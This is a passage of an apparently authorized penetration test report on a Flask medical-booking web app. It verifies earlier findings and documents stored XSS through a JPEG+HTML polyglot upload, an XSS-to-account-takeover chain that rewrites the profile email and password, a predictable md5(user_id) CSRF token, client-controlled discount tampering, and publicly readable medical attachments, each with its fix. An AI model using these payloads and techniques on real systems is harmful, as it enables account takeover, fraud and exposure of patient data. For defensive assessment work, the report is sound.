| The tested SSTI payload was rendered literally (report body). | **CONFIRMED** | Report `3994` rendered `{{7*7}}` literally. New report `3995` also rendered `{{7*7}}` literally while its `<script>` executed. |
| Basic path traversal attempts were sanitized (`D.8`). | **CONFIRMED from prior evidence; not repeated** | Prior `../poc-traversal.jpg.html` landed inside `attachments/`. No new reason to repeat the payload. |
| Report tokens use unsigned Base64 data, but session/ownership checks prevented the tested IDOR attempts (`D.10`). | **PARTIALLY CONFIRMED / CORRECTED** | Token is unsigned and `user_id` is type-coerced; `user_id:999` gives `404`. However, cross-user `report_id` access was **not conclusively tested**; see §3 and §5. |
| Flask session cookies are signed and modified cookies are rejected (`D.10`). | **CONFIRMED** | Changing the last character of the signed cookie produced `302 /login`. |
| Patient credentials do not grant access to the separate admin portal (`D.11`). | **CONFIRMED (negative for the tested vector)** | One benign admin POST with `te@st`/`123456` returned `Administrative email account not found in system.`; no admin cookie or content. |
| No RCE, privilege escalation, or admin authentication bypass has been confirmed. | **CONFIRMED as a negative for the tested vectors** | No RCE was reproduced. No admin bypass was found. This is not proof of absence. |
| No CSRF tokens on any form (recon). | **CORRECTED** | `/transfer_points` does have a token, but it is predictable (`md5(user_id)`); `/profile`, `/reports/create`, `/reports/upload-attachment`, `/lab-tests/book`, `/login`, `/logout` (GET), and admin login lack effective CSRF protection. |
| Client-trusted lab discount (`discount_pct`) was a lead, not exercised (recon). | **CONFIRMED (new test)** | With the valid public code `NILECARE10` and `discount_pct=90`, a 350 EGP CBC was booked for 34 EGP and stored as `-90%`. An invalid code was rejected. |
| No HSTS, CSP, or X-Frame-Options (recon). | **CONFIRMED** | Also missing: `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`. |
| Uploaded avatars/attachments are publicly retrievable (recon). | **CONFIRMED** | Our uploaded `.jpg.py` and `.jpg.html` were fetched without cookies; prior `king.jpeg` and the active avatar were also public. Directory listing is `404`. |
| A failed admin login sets no cookie (`D.11`). | **CORRECTED nuance** | Without a session, that held. With an existing patient session, the admin POST re-signed the shared Flask session to store the flash message. It did **not** create an admin session. |
| `user_id:999` in a report token is not admin (`D.10`). | **CONFIRMED** | `user_id:999` gives `404`; extra `is_admin`/`role` fields are ignored; no admin UI or actions appear. |

Recon-only observations (prices, doctor data, TLS 1.0/1.1 acceptance, guest booking) were not all re-tested; they are not treated here as vulnerability conclusions.

---

#### 2. Findings independently verified

##### 2.1 Authentication and session baseline

```bash
H=https://magnetic-paragraph-romance-hobbies.trycloudflare.com
curl -sS -c cj.txt -b cj.txt -o /dev/null "$H/login"
curl -sS -D login.headers -o /dev/null -c cj.txt -b cj.txt \
  -X POST "$H/login" --data-urlencode 'email=te@st' --data-urlencode 'password=123456'
# 302 -> /dashboard
# Set-Cookie: session=<redacted>; HttpOnly; Path=/
# no Secure, no SameSite, no pre-auth session cookie
```

- A modified signed cookie (`last character -> X`) produced `302 /login`.
- The session payload is a Flask/itsdangerous signed cookie; the server accepted only the unmodified value.
- No pre-auth session was issued, so classic session fixation through a pre-login cookie was not applicable in the tested flow.

##### 2.2 Upload validation: `.jpg.py` versus `.jpg.html`

| Test | Expected | Actual |
|---|---|---|
| Clean JPEG, filename `fsa-f8d89e8c.jpg.py`, declared `image/jpeg`, to `/reports/upload-attachment` | Reject executable final suffix, or store but serve inertly | `302 /dashboard`; `GET /static/uploads/attachments/fsa-f8d89e8c.jpg.py` → `200`, `content-type: text/x-python; charset=utf-8`, `content-length: 7160`, first bytes `ff d8 ff e0`; no execution |
| JPEG+HTML polyglot, filename `fsa-f8d89e8c.jpg.html`, declared `image/jpeg` | Reject HTML final suffix, or serve as download/image | `302 /dashboard`; `GET` → `200`, `content-type: text/html; charset=utf-8`, `content-disposition: inline`, one `<script>`; Chromium executed it |
| JPEG, filename `fsa-f8d89e8c.jpg.py`, to `/profile` | Reject `.py` final suffix | `302 /profile`; flash `Invalid image format. Allowed formats: png, jpg, jpeg, gif.` Avatar unchanged |

The attachment filter is a **substring** check (`.jpg` anywhere in the name) plus a JPEG magic-byte check, while the static server chooses MIME type from the **final** suffix. The profile filter uses a final-extension check and rejects `.py`.

##### 2.3 Stored XSS via the attachment endpoint

The fresh polyglot was 240 bytes: 20-byte JPEG SOI/APP0 header (`ffd8ffe000104a46494600010100000100010000`) followed by:

```html
<!doctype html><html><head><title>FSA-XSS-f8d89e8c</title></head>
<body><h1>FSA-XSS-f8d89e8c</h1>
<script>document.body.setAttribute("data-fsa","FSA-XSS-f8d89e8c");document.title="FSA-XSS-f8d89e8c";</script>
</body></html>
```

Playwright/Chromium (no authenticated cookies) loaded the public URL and reported:

```
status=200
content_type=text/html; charset=utf-8
title=FSA-XSS-f8d89e8c
data-fsa=FSA-XSS-f8d89e8c
script_count=1
body_text=<JPEG bytes> | FSA-XSS-f8d89e8c
```

This re-establishes the prior D.8 finding with a live payload and proves the file is public and same-origin.

##### 2.4 Report rendering and report-token behavior

A benign report `3995` (`FSA-REPORT-f8d89e8c`) was created with:

```
<b>FSA-BOLD-f8d89e8c</b>
<script>document.body.setAttribute('data-fsa','REPORT-XSS-f8d89e8c');
document.title='REPORT-XSS-f8d89e8c'</script>
{{7*7}}
```

The report page contained the raw `<script>` and, in Chromium:

```
status=200
title=REPORT-XSS-f8d89e8c
data-fsa=REPORT-XSS-f8d89e8c
script_count=1
has_49=False
has_literal_7x7=True
```

So the report-body sink is stored XSS, while `{{7*7}}` remains literal (SSTI negative in this sink). Report `2052` independently showed the same raw-HTML sink; its existing `<script>alert(1)<script/>` is malformed, so it did not execute.

Report-token behavior with the legitimate session:

| Token payload | Result |
|---|---|
| `{"user_id":896,"report_id":3995}` | `200`, report renders |
| `{"user_id":"896","report_id":3995}` | `200` — string is coerced |
| `{"user_id":896,"report_id":3995,"is_admin":true,"role":"admin"}` | `200` — extra fields ignored |
| `{"report_id":3995}` | `400` |
| `{"user_id":999,"report_id":3995}` | `404 Access Denied or Report Not Found` |

The token is unsigned Base64 JSON and is not a privilege token. The tested `user_id` tampering is blocked, but the cross-user `report_id` case is unresolved (§5).

##### 2.5 Profile upload and admin portal

- Profile `.jpg.py`: rejected with the exact allowed-format message; avatar unchanged.
- Admin portal `GET`: `200` login form, no `csrf_token`.
- Admin `POST` with `te@st`/`123456`: `200`, `Administrative email account not found in system.` No admin cookie, no admin content. The patient session only added the normal patient nav/flash.
- Prior random-address test returned the same message; no account-existence oracle was established for admin addresses.

##### 2.6 Public file access

Without any cookies:

```
GET /static/uploads/attachments/fsa-f8d89e8c.jpg.py    -> 200 text/x-python
GET /static/uploads/attachments/fsa-f8d89e8c.jpg.html  -> 200 text/html
GET /static/uploads/user_896_1793068959.jpg             -> 200 image/jpeg (prior evidence)
GET /static/uploads/attachments/                         -> 404 (no directory listing)
```

Medical attachments are stored under a public static path. Attachment names are user-controlled; avatar names contain the user ID and a timestamp.

---

#### 3. Corrected conclusions

1. **D.10 overstates the IDOR conclusion.** The report token is unsigned and `user_id` tampering is rejected, but the statement “ownership-scoped to the session user” was not proven for a **different user's report ID**. `report_id=1/2` returning `404` is consistent with either ownership enforcement or non-existent records. Cross-user report access remains **INCONCLUSIVE / NOT TESTED** because no second authorized account exists and requesting likely-real IDs would breach the no-real-patient-data constraint.

2. **“No CSRF tokens on any form” is not accurate.** `/transfer_points` has a `csrf_token`, but it is static and predictable: the value `061412e4a03c02f9902576ec55ebbe77` equals `md5("896")` (the current user ID). It was identical across three independent sessions, `md5("897")` was rejected, and a random token was rejected. The token therefore provides no secret entropy.

3. **“A failed admin login sets no cookie” needs a nuance.** With no session, that was true. With an existing patient session, the admin POST re-signed the shared Flask session to carry the flash error. This is not an admin session and does not change the no-bypass conclusion.

4. **D.8's PoCs were neutralized, not disproven.** The three `poc*.jpg.html` files now return clean JPEG bytes. The fresh `fsa-*.jpg.html` payload re-proves the finding; the earlier conclusion was correct.

5. **The user brief's “medical upload accepts `poc.jpg.py`” is endpoint-specific.** It is true for `/reports/upload-attachment`; the profile endpoint rejects `.py`. The attachment `.jpg.py` is served as `text/x-python` and is **not executed**.

6. **“Report tokens are unsigned” does not equal “IDOR confirmed.”** The token is unsigned and `user_id` is coerced, but the endpoint enforces at least a token/session `user_id` match. The remaining question is whether it also enforces report ownership; that is the unresolved authorization test.

7. **“No RCE” remains a negative for the tested vectors, not proof of absence.** The `.jpg.py` static-serving result, literal SSTI, profile rejection, and prior command-injection tests are all negative, but no source review or exhaustive sink coverage was possible.

8. **“Server rejects invalid discount codes” is confirmed, but incomplete.** An invalid code is rejected and does not create a booking. Once a valid public code (`NILECARE10`) is supplied, the server trusts the client's `discount_pct`; a 90% discount was stored.

---

#### 4. New security findings

##### F1 — Public stored XSS through the medical-attachment upload

| Field | Detail |
|---|---|
| **Endpoint** | `POST /reports/upload-attachment`; `GET /static/uploads/attachments/<name>` |
| **Category** | Unrestricted file upload → stored XSS (CWE-79 / CWE-434) |
| **Preconditions** | Authenticated patient to upload; any user (including unauthenticated) can fetch the resulting public URL; victim must open the URL for execution |
| **Exact test** | Upload a 240-byte JPEG+HTML polyglot named `fsa-f8d89e8c.jpg.html` with `type=image/jpeg`; fetch it without cookies; load it in Chromium |
| **Expected** | Final extension is validated; HTML is not served as active content, or the file is downloaded/inert |
| **Actual** | `302 /dashboard`; `GET` → `200 text/html; charset=utf-8`, `Content-Disposition: inline`; one `<script>`; Chromium set `title` and `data-fsa` to the marker |
| **Reproducibility** | Deterministic; reproduced with three independent polyglot uploads (simple XSS, email-change chain, password-change chain) and consistent with prior D.8 |
| **Security impact** | Arbitrary JavaScript on the application origin; can issue authenticated same-origin requests, read same-origin data, and change account settings. This was chained to full account takeover (F2). The public URL makes delivery trivial. **Critical** |
| **Confidence** | **High** |
| **Recommended fix** | Validate the **final** extension against an allowlist; reject multiple extensions; decode and re-encode images; store outside the webroot; serve via an authenticated download route with `Content-Disposition: attachment`; randomize names; add `X-Content-Type-Options: nosniff`; deploy a restrictive CSP; scan uploads |

##### F2 — Stored XSS → full patient account takeover

| Field | Detail |
|---|---|
| **Endpoint** | XSS URL + `POST /profile` |
| **Category** | Stored XSS chained with missing re-authentication (CWE-79 / CWE-620) |
| **Preconditions** | Victim is logged in and opens the public XSS URL; `/profile` accepts email/password changes without the current password |
| **Exact test** | The XSS ran `fetch('/profile', {method:'POST', credentials:'include', body: new FormData(...)})`. First it changed the email to `fsa-xss-f8d89e8c@example.invalid`; later it changed the password to `Fsa-f8d89e8c-XSS!`. The old password then failed and the new password logged in. Both changes were reverted. |
| **Expected** | Sensitive profile changes require the current password/re-authentication; XSS cannot silently rotate credentials |
| **Actual** | XSS returned `200`; the profile changed; the old password returned `302 /login`; the new password returned `302 /dashboard`; the new email was immediately usable for login |
| **Reproducibility** | Two independent XSS-driven state changes (email, password), plus direct `curl` reproductions; deterministic |
| **Security impact** | An attacker can take over any logged-in patient account that opens the link: set a new email and password, then log in. No current password is required. **Critical** |
| **Confidence** | **High** (direct end-to-end) |
| **Recommended fix** | Require current password for email/password changes; verify the new email before it becomes a login identifier; notify the old email; invalidate all sessions on change; add CSRF protection; fix the XSS root cause; consider step-up authentication for sensitive changes |

##### F3 — Profile email/password changes without current password or verification

| Field | Detail |
|---|---|
| **Endpoint** | `POST /profile` |
| **Category** | Broken authentication / missing re-authentication (CWE-620) |
| **Preconditions** | A valid session (or XSS/CSRF that can act with it) |
| **Exact test** | Email: submitted `full_name=test`, `email=fsa-f8d89e8c@example.invalid`, `phone=0111111111111`, `password=` (empty). Login with the new email succeeded; the old email failed. Reverted. Password: submitted a new password without the current password. The old password failed; the new password succeeded. Reverted. |
| **Expected** | Current password required; new email verified; old credentials remain valid until verification |
| **Actual** | Both changes accepted with no current password; new email became the login identifier immediately; password changed immediately |
| **Reproducibility** | Repeated several times; deterministic |
| **Security impact** | Any session holder, XSS payload, or cross-site request (where the cookie is sent) can take over the account. **High** |
| **Confidence** | **High** |
| **Recommended fix** | Require the current password for both changes; send a confirmation link to the new email and a notification to the old one; do not use an unverified email for login; invalidate sessions; rate-limit and audit |

##### F4 — Logout does not invalidate the signed cookie; password change does not revoke other sessions

| Field | Detail |
|---|---|
| **Endpoint** | `GET /logout`; `POST /profile` |
| **Category** | Insufficient session expiration/revocation (CWE-613) |
| **Preconditions** | An old/stolen signed cookie; or a second active session |
| **Exact test** | Login, save the cookie jar, `GET /logout` (`302 /`), then replay the saved cookie: `GET /dashboard` → `200`, `Welcome back, test!`. Separately, sessions A and B were created; the password was changed via B; A still returned `200` on `/dashboard`. Reverted. |
| **Expected** | Logout invalidates the server-side session; a password change revokes other sessions |
| **Actual** | The old signed cookie remained valid after logout; session A remained valid after the password change |
| **Reproducibility** | Logout replay reproduced in two separate runs; password non-revocation reproduced |
| **Security impact** | A stolen cookie remains usable after logout and after a password reset; incident response cannot rely on logout. **Medium** (High if a cookie is stolen) |
| **Confidence** | **High** |
| **Recommended fix** | Use server-side sessions or a per-user session/token version; rotate the session on login and credential change; revoke all sessions on password change/logout; set an explicit expiry; clear cookies with `Secure` and `SameSite`; consider Flask-Session/Redis |

##### F5 — Session cookie is accepted over plain HTTP; no Secure/SameSite/HSTS

| Field | Detail |
|---|---|
| **Endpoint** | All responses; `Set-Cookie`; HTTP listener |
| **Category** | Session transport and cookie flags (CWE-319 / CWE-614 / CWE-1004) |
| **Preconditions** | Network attacker or a user who reaches the HTTP URL |
| **Exact test** | `curl -I http://<host>/` → `HTTP/1.1 200 OK`, no HSTS; `curl -b cj.txt http://<host>/dashboard` → `200`, `Welcome back, test!`; the cookie is `HttpOnly; Path=/` only (no `Secure`, no `SameSite`); Playwright reports the default `SameSite=Lax` |
| **Expected** | HTTP redirects to HTTPS; HSTS; `Secure`; `SameSite=Lax/Strict`; `__Host-` prefix |
| **Actual** | The app is reachable over HTTP, the cookie is sent and accepted over HTTP, and no HSTS/`Secure`/`SameSite` is set |
| **Reproducibility** | Deterministic |
| **Security impact** | Session interception on cleartext networks; increased CSRF exposure; cookie may be sent on an HTTP request. **High** |
| **Confidence** | **High** |
| **Recommended fix** | Enforce HTTPS at Cloudflare and the app; add HSTS; set `Secure`, `SameSite=Lax` (Strict for sensitive flows), `HttpOnly`, and `Path=/`; use the `__Host-` prefix; consider short-lived sessions |

##### F6 — Predictable, static CSRF token (`md5(user_id)`) and cross-site POST acceptance

| Field | Detail |
|---|---|
| **Endpoint** | `POST /transfer_points` |
| **Category** | Predictable CSRF token (CWE-352 / CWE-330) |
| **Preconditions** | Authenticated victim; attacker knows or guesses the victim's user ID; the browser sends the session cookie on the cross-site POST |
| **Exact test** | The form token `061412e4a03c02f9902576ec55ebbe77` equals `md5("896")`; it was identical in three independent sessions; `md5("897")` and a random value were rejected. A cross-site HTML form from `http://127.0.0.1:8123` posted to `/transfer_points` with the predicted token and `recipient_email=te@st`, `amount=1`, after a fresh Chromium login. |
| **Expected** | An unpredictable, per-session token that is not derivable from the user ID |
| **Actual** | Token is deterministic from the user ID and not session-bound. The cross-site POST reached the authenticated handler and passed CSRF validation (flash `You cannot transfer points to yourself.`), meaning the cookie was sent in Chromium immediately after login. The self-transfer rule blocked the transfer. |
| **Reproducibility** | Token derivation 3/3 sessions; cross-site test 1/1; `md5("897")` and random controls rejected |
| **Security impact** | Token secrecy is defeated. If a victim's user ID is known (report tokens, avatar filenames, or sequential IDs) and the cookie is transmitted, an attacker can forge transfer/profile/report requests. Full cross-account transfer was not attempted because no second authorized account exists. The immediate post-login success is consistent with Chromium's Lax+POST 2-minute grace; behavior after that window was not tested. **High** |
| **Confidence** | **High** on the derivation; **Medium** on cross-account practical exploitability |
| **Recommended fix** | Use Flask-WTF/`CSRFProtect` per-session random tokens; never derive tokens from user IDs; validate `Origin`/`Referer`; set `SameSite`; require re-authentication for points transfers; add server-side idempotency and audit |

##### F7 — Missing CSRF protection on state-changing endpoints

| Field | Detail |
|---|---|
| **Endpoint** | `/profile`, `/reports/create`, `/reports/upload-attachment`, `/lab-tests/book`, `/login`, `GET /logout`, admin login |
| **Category** | Missing CSRF (CWE-352) |
| **Preconditions** | Authenticated victim; a cross-site request that carries the cookie, or an XSS on the origin |
| **Exact test** | The forms contain no `csrf_token`; direct POSTs succeeded for profile email/password, report creation, attachment upload, and lab booking. Only `/transfer_points` had a token. `GET /logout` returned `302 /` without a token. |
| **Expected** | A token on every state-changing request; logout via POST with a token; Origin checks |
| **Actual** | No token on the listed forms; logout is a GET; the only token is the predictable transfer token |
| **Reproducibility** | Deterministic |
| **Security impact** | State changes (credentials, reports, uploads, bookings, logout, admin login) can be forged under cookie-transmission conditions; XSS bypasses CSRF entirely. Login CSRF and forced logout are also possible. **High** |
| **Confidence** | **High** for the missing controls; **Medium** for cross-site exploitability because of browser SameSite behavior |
| **Recommended fix** | Enable global CSRF protection; add tokens to every form; make logout POST-only with a token; validate `Origin`/`Referer`; use `SameSite`; re-authenticate for sensitive actions |

##### F8 — Client-controlled lab discount (price tampering)

| Field | Detail |
|---|---|
| **Endpoint** | `POST /lab-tests/book` |
| **Category** | Client-controlled price/discount (CWE-602 / CWE-840) |
| **Preconditions** | Authenticated patient; the public code `NILECARE10` is known (it is in the page JavaScript) |
| **Exact test** | `test_id=1` (CBC, 350 EGP), `discount_pct=90`, `discount_code=NILECARE10` → `302 /dashboard`; flash `Lab test "Complete Blood Count (CBC)" booked successfully for 34 EGP!`; the booking row showed base `350 EGP`, discount `-90%`, amount paid `34 EGP`. Control: `discount_code=NOT-A-REAL-CODE` + `discount_pct=90` → `Invalid discount code. Please check and try again.`; no new row (row count stayed 5). |
| **Expected** | The server computes the 10% code discount itself: 350 EGP → 315 EGP; ignores `discount_pct` |
| **Actual** | The server accepted the client's 90% value after a valid code was supplied and stored a 34 EGP booking. The account already contained two pre-existing `-100%` / `0 EGP` bookings dated 2026-10-27 (not created by this pass), which is consistent with the same flaw or prior testing. |
| **Reproducibility** | One controlled booking; the stored row and pre-existing `-100%` rows corroborate; behavior is deterministic |
| **Security impact** | Direct revenue loss and financial-integrity failure; free or heavily discounted tests; audit and reconciliation risk. **High** |
| **Confidence** | **High** |
| **Recommended fix** | Compute prices and discounts server-side from a trusted table and the validated code; never trust `discount_pct`; clamp to 0–100; use integer math; log and reconcile; audit/remove anomalous bookings |

##### F9 — Medical attachments and avatars are publicly readable without authorization

| Field | Detail |
|---|---|
| **Endpoint** | `/static/uploads/attachments/*`, `/static/uploads/*` |
| **Category** | Missing authorization / public PHI storage (CWE-284 / CWE-200) |
| **Preconditions** | The URL is known or guessable |
| **Exact test** | Fetched our uploaded `.jpg.py` and `.jpg.html` without cookies → `200`. Prior `king.jpeg` and the active avatar `user_896_1793068959.jpg` were also `200` without cookies. `GET /static/uploads/attachments/` → `404` (no listing). |
| **Expected** | Medical attachments require authentication and ownership; names are unguessable; files are outside the public webroot or served by an authorized route |
| **Actual** | Public `200` with `Content-Disposition: inline`; attachment names are user-controlled; avatar names contain `user_<id>_<timestamp>` |
| **Reproducibility** | Deterministic; multiple files |
| **Security impact** | PHI/attachment disclosure if a URL is known or guessed; supports public XSS delivery. **Medium** (High for sensitive documents) |
| **Confidence** | **High** |
| **Recommended fix** | Store uploads outside the webroot; serve via an authenticated, ownership-checked download route; use random UUID names; set `Content-Disposition: attachment`; add `nosniff`; audit access; avoid public avatars for sensitive users |

##### F10 — Stored XSS in the report body (session/token-scoped)

| Field | Detail |
|---|---|
| **Endpoint** | `GET /api/v1/reports/view?token=...` |
| **Category** | Stored XSS / output encoding (CWE-79) |
| **Preconditions** | A valid session and a token whose `user_id` matches it; report ownership for a cross-user `report_id` is not conclusively established |
| **Exact test** | Created report `3995` with `<b>`, a well-formed `<script>` marker, and `{{7*7}}`; viewed it with the test-account session and loaded it in Chromium |
| **Expected** | Report content is HTML-escaped; only intended markup is rendered |
| **Actual** | The report body is emitted raw inside a `white-space: pre-wrap` div; the script executed (`title`/`data-fsa`), while `{{7*7}}` remained literal |
| **Reproducibility** | Deterministic; report `2052` independently shows the same raw sink |
| **Security impact** | Session/owner-scoped XSS today (the tested report belongs to the session user). It becomes more serious if reports are shared, viewed by staff/admin, or exposed through an IDOR. It also confirms a general output-encoding defect. **Medium** |
| **Confidence** | **High** |
| **Recommended fix** | Rely on Jinja autoescaping; explicitly escape report content (`markupsafe.escape`); do not use `|safe`; sanitize any intended rich text; add a strict CSP; review title/lab/status sinks |

##### F11 — Missing defense-in-depth security headers

| Field | Detail |
|---|---|
| **Endpoint** | All responses, including static HTML |
| **Category** | Missing security headers (CWE-693 / CWE-1021) |
| **Exact test** | Inspected `/login`, `/dashboard`, and the stored HTML file: no `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`, or `Permissions-Policy` |
| **Expected** | CSP, frame-ancestors/XFO, `nosniff`, Referrer-Policy, HSTS, Permissions-Policy |
| **Actual** | None present; the stored HTML is served `text/html` with `inline` disposition |
| **Reproducibility** | Deterministic |
| **Security impact** | Clickjacking, MIME sniffing, weaker XSS containment, referrer leakage. **Low–Medium** |
| **Confidence** | **High** |
| **Recommended fix** | Add a restrictive CSP (no `unsafe-inline`; nonces/hashes), `X-Frame-Options: DENY` or `frame-ancestors 'none'`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, and HSTS |

##### F12 — Attachment filter accepts executable-looking final suffixes (`.jpg.py`)

| Field | Detail |
|---|---|
| **Endpoint** | `POST /reports/upload-attachment` |
| **Category** | Dangerous extension acceptance / filter inconsistency (CWE-434) |
| **Preconditions** | Authenticated patient |
| **Exact test** | Clean JPEG named `fsa-f8d89e8c.jpg.py`, declared `image/jpeg` |
| **Expected** | Reject executable suffixes; validate the final extension |
| **Actual** | Accepted and served as `text/x-python`; no execution observed |
| **Reproducibility** | Deterministic |
| **Security impact** | Low today because the file is static and not executed. It is a dangerous stored artifact and a filter-bypass pattern that could become RCE if the serving/handling stack changes. **Low** |
| **Confidence** | **High** |
| **Recommended fix** | Allowlist the final extension; reject multiple extensions and executable suffixes; re-encode images; serve as an attachment with `nosniff` |

##### F13 — Admin login has no CSRF token and shares the patient Flask session for flashes

| Field | Detail |
|---|---|
| **Endpoint** | `/admin_portal_temp_secure_9203` |
| **Category** | Missing CSRF on admin authentication / session coupling (CWE-352) |
| **Preconditions** | Victim visits the admin portal; attacker can submit a cross-site login form |
| **Exact test** | `GET` the admin form (no token); `POST` patient credentials with an existing patient session; inspect headers/body |
| **Expected** | CSRF token on admin login; separate admin session cookie/scope; no patient-session coupling |
| **Actual** | No token; the failed POST re-signed the shared Flask session to store the flash; no admin session or content was created; the patient nav remained |
| **Reproducibility** | Deterministic |
| **Security impact** | Login CSRF and forced-logout style issues; no admin bypass was found. **Low–Medium** |
| **Confidence** | **High** for the missing token/no bypass; **Medium** for exploit impact |
| **Recommended fix** | Add CSRF tokens to admin login/logout; use a separate session cookie/scope; rate-limit and alert; require MFA for admin accounts; audit admin authentication |

---

#### 5. Tests that failed or were inconclusive

- **Cross-user report IDOR — INCONCLUSIVE / NOT TESTED.** The token is unsigned and `user_id` is coerced, but a different user's `report_id` was not requested. `user_id` tampering gives `404`, and `report_id=1/2` gives `404`, but that is ambiguous between ownership enforcement and non-existent records. A second authorized account or source review is needed.
- **Cross-account points transfer and negative/overflow amounts — NOT TESTED.** Self-transfer is blocked (`You cannot transfer points to yourself.`). Testing a real recipient requires a second authorized account; negative/overflow amounts could affect balances and were not attempted.
- **Admin authentication bypass — NOT REPRODUCED.** One benign patient-credential attempt returned `Administrative email account not found in system.` No admin credentials were guessed or brute-forced. This is not proof that no bypass exists.
- **RCE — NOT REPRODUCED / no evidence.** `.jpg.py` is static `text/x-python`; profile `.py` is rejected; SSTI is literal in the report body; prior command-injection vectors were negative. No source review or exhaustive sink coverage was possible.
- **Deserialization — NOT TESTED.** No source and no observable import/export sink. No claim is made.
- **Path traversal — NOT REPEATED.** Prior D.8 showed sanitization; no new reason to repeat the payload.
- **CSRF after the 2-minute Lax+POST window — NOT TESTED.** The cross-site POST succeeded immediately after login in Chromium; later behavior was not measured.
- **Report-body XSS delivery to another user — NOT TESTED.** The report view requires the token `user_id` to match the session; cross-user delivery depends on the unresolved report-ownership/IDOR question.
- **Upload variants (`.svg`, `.pdf`, `.phtml`, null/unicode suffixes) — NOT TESTED.** The `.html` polyglot already proves active content; other variants may add bypasses.
- **Email/password reset flow — NOT TESTED.** No reset flow was exercised; its token security remains unknown.
- **Admin account enumeration — INCONCLUSIVE.** Prior tests returned the same message for a valid patient and a random address; not exhaustive.
- **Rate limiting/lockout — NOT TESTED.** No brute force was performed.
- **TLS 1.0/1.1 acceptance — NOT TESTED in this pass.** Prior recon reported it; not re-measured.

---

#### 6. Remaining unexplored attack surfaces

1. **Report authorization:** cross-user `report_id` with a matching token `user_id`; report sharing/export/download routes; admin/staff report views.
2. **Points transfer logic:** cross-account transfer, negative/zero/float/overflow amounts, recipient enumeration, race conditions, idempotency, balance reconciliation.
3. **Admin portal:** real admin authentication, MFA, lockout, session separation, CSRF, password reset, audit logs, default/seed accounts (without brute force).
4. **Upload handling:** `.svg`, `.pdf`, `.phtml`, `.htm`, null-byte/unicode suffixes, content-type confusion, image parser vulnerabilities, archive/zip, filename normalization, storage path traversal.
5. **Template/rendering:** title/lab/status/other report fields, email templates, PDF generation, admin templates, any `|safe` or `render_template_string` sink.
6. **Deserialization:** any import/export, backup, report-generation, or session serializer that accepts untrusted data.
7. **Password reset and email verification:** token entropy, expiry, single-use, host-header poisoning, account enumeration.
8. **Session lifecycle:** fixation/rotation, cookie scope, expiry, revocation, concurrent sessions, remember-me, logout across devices.
9. **CSRF:** behavior after the Lax+POST window, `Origin`/`Referer` validation, login CSRF, logout CSRF, admin CSRF.
10. **PHI exposure:** predictable attachment/avatar names, public static paths, cache headers, Cloudflare cache behavior, referrer leakage.
11. **Rate limiting and abuse:** login, registration, booking, contact, reviews, upload, transfer, admin login.
12. **Infrastructure:** origin exposure behind the Quick Tunnel, TLS configuration, Cloudflare settings, secret management, debug mode, error pages.

---

#### 7. Prioritized recommendations

**P0 — fix before any further exposure**

1. **Eliminate the public stored XSS:** validate the final extension, reject multiple/executable suffixes, re-encode images, store uploads outside the webroot, serve via an authenticated download route with `Content-Disposition: attachment`, randomize names, add `nosniff` and a strict CSP.
2. **Require re-authentication for credential changes:** current password for email/password changes; verify the new email; notify the old email; invalidate all sessions on change.
3. **Replace the CSRF design:** per-session random tokens via Flask-WTF/`CSRFProtect`; never `md5(user_id)`; add tokens to every state-changing form; make logout POST-only; validate `Origin`/`Referer`; set `SameSite`.
4. **Stop the account-takeover chain:** fixing the XSS and the profile re-auth issue together removes the demonstrated end-to-end takeover.

**P1 — high-value hardening**

5. **Server-side pricing:** compute lab discounts from a trusted table and the validated code; ignore `discount_pct`; clamp and audit; reconcile existing `-100%`/`0 EGP` bookings.
6. **Session transport:** enforce HTTPS, HSTS, `Secure`, `SameSite`, `__Host-`; ensure Cloudflare "Always Use HTTPS" is enabled.
7. **Authorization for PHI:** authenticated/ownership-checked attachment downloads; random names; no public static medical files; audit access.
8. **Session revocation:** server-side sessions or token versioning; rotate on login/password change; revoke all sessions on logout/password change; add expiry.

**P2 — defense in depth**

9. **Security headers:** CSP, XFO/frame-ancestors, `nosniff`, Referrer-Policy, Permissions-Policy, HSTS.
10. **Report token hardening:** sign the token or use opaque server-side IDs; enforce report ownership explicitly; remove `user_id` from client-visible tokens; test cross-user access with a second authorized account.
11. **Admin portal:** CSRF, separate session scope, MFA, rate limiting, lockout, audit logging, no shared patient session for admin flows.
12. **Input/output review:** escape report title/lab/status/body; review all `|safe`, `render_template_string`, and HTML-building code.

**P3 — programmatic**

13. Add security regression tests for upload extensions, XSS, CSRF, IDOR, session revocation, and discount calculation.
14. Add rate limiting, monitoring/alerting for credential changes and transfers, dependency scanning, secret management, and a pre-production security review.
15. Re-test cross-user IDOR and points-transfer logic with a second authorized test account in an isolated environment.

---

#### Evidence, artifacts, and cleanup

**New artifacts created by this pass**

| Artifact | Location | Notes |
|---|---|---|
| `fsa-f8d89e8c.jpg.py` | `/static/uploads/attachments/` | Clean 7,160-byte JPEG; served `text/x-python`; no execution |
| `fsa-f8d89e8c.jpg.html` | `/static/uploads/attachments/` | 240-byte JPEG+HTML polyglot; public stored XSS |
| `fsa-f8d89e8c-chain.jpg.html` | `/static/uploads/attachments/` | XSS payload that changed the profile email same-origin |
| `fsa-f8d89e8c-pwchain.jpg.html` | `/static/uploads/attachments/` | XSS payload that changed the profile password same-origin |
| Report `3995` (`FSA-REPORT-f8d89e8c`) | Application database | Contains the benign report-body XSS/SSTI marker |
| CBC booking, 2026-10-27 | Application database | 350 EGP, `-90%`, 34 EGP paid; created by this pass |

**Pre-existing state observed, not created by this pass:** four booking rows, including a Chest X-Ray and an Abdominal Ultrasound at `-100%` / `0 EGP` dated 2026-10-27, and two Thyroid panels at 650 EGP. The two `-100%` rows corroborate the discount flaw but were present before this pass.

**Account state:** `te@st` / `123456`, email `te@st`, active avatar `user_896_1793068959.jpg`. The temporary email and password changes were reverted and the original login was verified (`302 /dashboard`).

**Cleanup:** the app exposes no delete route for attachments or reports. Remove the new files on the server:

```bash
cd static/uploads/attachments
rm -f fsa-f8d89e8c.jpg.py \
      fsa-f8d89e8c.jpg.html \
      fsa-f8d89e8c-chain.jpg.html \
      fsa-f8d89e8c-pwchain.jpg.html
```

Remove report `3995` and the 2026-10-27 CBC booking through the application's database/admin tooling (no delete route was found). Review the pre-existing `-100%` bookings as part of the same pricing audit.

The older `poc.jpg.html`, `poc2.jpg.html`, and `poc-traversal.jpg.html` remain clean 517-byte JPEGs; the prior cleanup note still applies.

---

